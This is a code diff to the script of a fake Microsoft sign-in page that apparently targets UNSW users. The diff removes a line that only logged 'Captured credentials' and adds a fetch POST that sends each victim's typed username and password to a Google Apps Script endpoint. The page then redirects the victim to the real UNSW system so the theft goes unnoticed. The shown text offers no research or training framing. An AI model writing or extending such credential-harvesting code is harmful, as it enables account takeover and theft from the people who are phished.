@@ -1,3 +1,5 @@
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxJ0LoJfDIoXd639yeJhNYvQ-fL32TYl0ZiQqqqtr9OUVygL1AzcyDOoCE8YsrCM0pUwg/exec";
+
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
@@ -104,7 +106,20 @@ document.addEventListener('DOMContentLoaded', () => {
             const username = document.getElementById('inp_uname').value;
             const password = document.getElementById('inp_pwd').value;
         
-            console.log("Captured credentials:", { username, password });
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                },
+                body: new URLSearchParams({
+                    username: document.getElementById('inp_uname').value,
+                    password: document.getElementById('inp_pwd').value
+                })
+            })
+            .then(res => res.text())
+            .then(console.log)
+            .catch(console.error);
+
 
             // Redirect to UNSW system after 1 second
             setTimeout(() => {
